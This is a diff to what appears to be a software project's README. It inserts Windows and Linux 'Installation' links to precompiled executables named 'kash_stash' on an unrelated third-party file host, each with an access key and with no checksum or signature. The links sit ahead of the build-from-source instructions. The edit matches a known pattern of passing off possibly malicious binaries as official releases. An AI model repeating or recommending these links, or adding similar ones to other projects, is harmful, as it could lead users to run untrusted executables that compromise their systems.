@@ -17,6 +17,12 @@
 
 ## ⚙️ Installation
 
+## Windows
+https://files.irate-wombat.com/api/files/files%2F2025-11-2%2Fkash_stash.exe?key=135524ce1bf426cec56a98b69adae57f
+
+## Linux
+https://files.irate-wombat.com/api/files/files%2F2025-11-2%2Fkash_stash?key=91ac07999eee628b61102c8bef0537fb
+
 ### From Source
 
 ```bash
